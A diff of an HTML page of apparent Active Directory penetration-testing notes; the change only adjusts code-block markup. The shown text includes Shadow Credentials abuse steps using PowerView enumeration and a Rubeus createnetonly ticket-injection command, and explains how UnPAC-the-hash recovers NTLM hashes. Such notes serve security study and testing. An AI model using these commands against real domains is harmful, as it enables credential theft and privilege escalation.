@@ -799,7 +799,7 @@ Ticket combinations from Zero-Point Security</p>
    <span class="token function">export</span> KRB5CCNAME<span class="token operator">=</span>user2.ccache
 </code></pre>
 <p><strong>Abuse in Windows:</strong></p>
-<pre class=" language-bash"><code class="prism  language-bash">1. <span class="token comment"># Let's import PowerView and enumerate principals with write access over the msDS-KeyCredentialLink attribute on other principals.</span>
+<code class="prism  language-bash">1. <span class="token comment"># Let's import PowerView and enumerate principals with write access over the msDS-KeyCredentialLink attribute on other principals.</span>
    a. <span class="token comment"># Import PowerView</span>
 	  Import-Module PowerView.ps1
 		  
@@ -825,7 +825,7 @@ Ticket combinations from Zero-Point Security</p>
 	 
 6. <span class="token comment"># Now pass into createnetonly</span>
    Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:randompass /ticket:<span class="token operator">&lt;</span>base64 <span class="token function">service</span> ticket<span class="token operator">&gt;</span> /show
-</code></pre>
+</code>
 <br>
 <h3 id="unpac-the-hash">UnPAC the Hash</h3>
 <p>Let’s add on to what we learned from the Shadow Credentials attack, if a TGT was obtained with PKINIT, and you use it to request a service ticket, the service ticket will contain the NTLM hash of the user/computer that the TGT belongs to, inside the PAC in the PAC_CREDENTIAL_INFO field. And just like normal, the ticket is encrypted using the key of the service it is issued for. This was implemented for compatibility in the event the user/computer needs to access resources that require NTLM authentication.</p>
